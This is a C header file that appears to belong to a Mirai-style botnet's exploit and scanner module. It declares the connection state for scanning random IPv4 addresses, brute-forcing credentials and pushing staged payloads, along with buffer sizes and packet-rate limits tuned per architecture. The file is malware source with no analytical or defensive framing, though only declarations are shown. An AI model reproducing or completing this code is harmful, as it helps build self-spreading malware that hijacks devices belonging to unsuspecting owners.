#pragma once

#include <stdint.h>

#include "includes.h"

#ifdef X86_64
#define exploit2_SCANNER_MAX_CONNS 512
#define exploit2_SCANNER_RAW_PPS 1440
#else
#define exploit2_SCANNER_MAX_CONNS 128
#define exploit2_SCANNER_RAW_PPS 160
#endif
#ifdef X86_64
#define exploit2_SCANNER_RDBUF_SIZE 1024
#define exploit2_SCANNER_HACK_DRAIN 64
#else
#define exploit2_SCANNER_RDBUF_SIZE 256
#define exploit2_SCANNER_HACK_DRAIN 64
#endif

struct exploit2_scanner_connection
{
    int fd, last_recv;
    enum
    {
        exploit2_SC_CLOSED,
        exploit2_SC_CONNECTING,
        exploit2_SC_GET_CREDENTIALS,
        exploit2_SC_exploit2_STAGE2,
        exploit2_SC_exploit2_STAGE3,
    } state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    int rdbuf_pos;
    char rdbuf[exploit2_SCANNER_RDBUF_SIZE];
    char **credentials;
    char payload_buf[2560], payload_buf2[2560];
    int credential_index;
};

void exploit2_init();
void exploit2_kill(void);

static void exploit2_setup_connection(struct exploit2_scanner_connection *);
static ipv4_t get1_random_ip(void);

